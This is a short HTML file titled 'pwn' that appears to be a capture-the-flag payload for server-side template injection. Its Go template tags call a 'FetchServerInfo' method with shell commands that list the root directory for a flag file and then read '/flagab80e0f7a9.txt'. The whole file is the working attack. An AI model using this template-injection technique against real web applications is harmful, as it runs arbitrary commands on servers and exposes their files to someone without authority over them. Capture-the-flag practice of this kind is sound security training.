<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>

<body>
<h1>pwn</h1>
{{ .FetchServerInfo "ls / | grep flag" }} <br>
{{ .FetchServerInfo "cat /flagab80e0f7a9.txt" }}
</body>
</html>
